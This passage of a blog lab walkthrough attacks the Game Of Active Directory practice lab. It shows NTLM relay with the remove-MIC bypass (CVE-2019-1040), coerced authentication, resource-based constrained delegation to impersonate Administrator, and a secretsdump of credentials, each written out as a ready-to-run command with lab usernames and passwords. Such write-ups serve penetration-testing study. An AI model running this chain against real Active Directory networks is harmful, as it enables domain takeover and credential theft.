href="https://github.com/p0dalirius/Coercer.git">coercer</a></p><p>As explained beautifully in the hackndo blog (<a href="https://en.hackndo.com/ntlm-relay/">en.hackndo.com/ntlm-relay</a>) and in the hacker receipe (<a href="https://www.thehacker.recipes/ad/movement/ntlm/relay">www.thehacker.recipes/ad/movement/ntlm/relay</a>), you can’t relay smb connection to ldap(s) connection without using CVE-2019-1040 a.k.a remove-mic.</p><ul><li>Start the relay with remove mic to the ldaps of meereen.essos.local.</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ntlmrelayx <span class="nt">-t</span> ldaps://meereen.essos.local <span class="nt">-smb2support</span> <span class="nt">--remove-mic</span> <span class="nt">--add-computer</span> removemiccomputer <span class="nt">--delegate-access</span>
</pre></table></code></div></div><ul><li>Run the coerce authentication on braavos (braavos is a windows server 2016 up to date so petitpotam unauthenticated will not work here)</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 coercer.py <span class="nt">-u</span> khal.drogo <span class="nt">-d</span> essos.local <span class="nt">-p</span> horse <span class="nt">-t</span> braavos.essos.local <span class="nt">-l</span> 192.168.56.1
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/remove_mic.png" alt="remove_mic.png" /></p><ul><li>The attack worked we can now exploit braavos with RBCD</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>getST.py <span class="nt">-spn</span> HOST/BRAAVOS.ESSOS.LOCAL <span class="nt">-impersonate</span> Administrator <span class="nt">-dc-ip</span> 192.168.56.12 <span class="s1">'ESSOS.LOCAL/removemiccomputer$:_53&gt;W3){OkTY{ej'</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/rbcd_after_remove_mic.png" alt="rbcd_after_remove_mic.png" /></p><ul><li>and use that ticket to retreive secrets</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/workspace/Administrator.ccache
secretsdump <span class="nt">-k</span> <span class="nt">-no-pass</span> ESSOS.LOCAL/<span class="s1">'Administrator'</span>@braavos.essos.local
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/drom_the_mic_work.png" alt="drom_the_mic_work.png" /></p><p>Next time we will go back to the exploitation with a user account part (samccountname, printnightmare) : <a href="/posts/GOADv2-pwning-part5/">Goad pwning part5</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ad/'>AD</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ad/" class="post-tag no-text-decoration" >AD,</a> <a href="/tags/lab/" class="post-tag no-text-decoration" >Lab,</a> <a href="/tags/responder/" class="post-tag no-text-decoration" >responder,</a> <a href="/tags/mitm6/" class="post-tag no-text-decoration" >mitm6,</a> <a href="/tags/ntlm/" class="post-tag no-text-decoration" >ntlm</a> <a href="/tags/relay/" class="post-tag no-text-decoration" >relay</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=GOAD - part 4 - poison and relay - Mayfly&url=https://mayfly277.github.io/posts/GOADv2-pwning-part4/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=GOAD - part 4 - poison and relay - Mayfly&u=https://mayfly277.github.io/posts/GOADv2-pwning-part4/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=GOAD - part 4 - poison and relay - Mayfly&url=https://mayfly277.github.io/posts/GOADv2-pwning-part4/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/GOADv2-pwning_part1/">GOAD - part 1 - reconnaissance and scan</a><li><a href="/posts/GOADv2-pwning-part2/">GOAD - part 2 - find users</a><li><a href="/posts/GOADv2-pwning-part3/">GOAD - part 3 - enumeration with user</a><li><a href="/posts/GOADv2-pwning-part4/">GOAD - part 4 - poison and relay</a><li><a href="/posts/GOADv2-pwning-part5/">GOAD - part 5 - exploit with user</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ad/">AD,</a> <a class="post-tag" href="/tags/lab/">Lab,</a> <a class="post-tag" href="/tags/cme/">cme,</a> <a class="post-tag" href="/tags/adcs/">adcs</a> <a class="post-tag" href="/tags/amsi/">AMSI,</a> <a class="post-tag" href="/tags/bloodhound/">bloodhound</a> <a class="post-tag" href="/tags/certipy/">certipy,</a> <a class="post-tag" href="/tags/cve/">CVE,</a> <a class="post-tag" href="/tags/cve-2022-35914/">CVE-2022-35914</a> <a class="post-tag" href="/tags/cve/">CVE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/GOADv2-pwning_part1/"><div class="card-body"> <span class="timeago small" >Jul 3<i class="unloaded">2022-07-03T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GOAD - part 1 - reconnaissance and scan</h3><div class="text-muted small"><p> The lab is now up and running Goad introduction, let’s do some recon on it. Enumerate Network We will starting the reconnaissance of the Game Of Active Directory environment by searching all the ...</p></div></div></a></div><div class="card"> <a href="/posts/GOADv2-pwning-part2/"><div class="card-body"> <span class="timeago small" >Jul 4<i class="unloaded">2022-07-04T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GOAD - part 2 - find users</h3><div class="text-muted small"><p> We have done some basic reconnaissance on Goad pwning part1, now we will try to enumerate users and start to hunt credentials. Enumerate DC’s anonymously With CME cme smb 192.168.56.11 --users...</p></div></div></a></div><div class="card"> <a href="/posts/GOADv2-pwning-part3/"><div class="card-body"> <span class="timeago small" >Jul 7<i class="unloaded">2022-07-07T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GOAD - part 3 - enumeration with user</h3><div class="text-muted small"><p> We found some users on Goad pwning part2, now let see what we can do with those creds. User listing When you get an account on an active directory, the first thing to do is always getting th...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/GOADv2-pwning-part3/" class="btn btn-outline-primary" prompt="Older"><p>GOAD - part 3 - enumeration with user</p></a> <a href="/posts/GOADv2-pwning-part5/" class="btn btn-outline-primary" prompt="Newer"><p>GOAD - part 5 - exploit with user</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/M4yFly">mayfly</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ad/">AD,</a> <a class="post-tag" href="/tags/lab/">Lab,</a> <a class="post-tag" href="/tags/cme/">cme,</a> <a class="post-tag" href="/tags/adcs/">adcs</a> <a class="post-tag" href="/tags/amsi/">AMSI,</a> <a class="post-tag" href="/tags/bloodhound/">bloodhound</a> <a class="post-tag" href="/tags/certipy/">certipy,</a> <a class="post-tag" href="/tags/cve/">CVE,</a> <a class="post-tag" href="/tags/cve-2022-35914/">CVE 2022 35914</a> <a class="post-tag" href="/tags/cve/">CVE</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
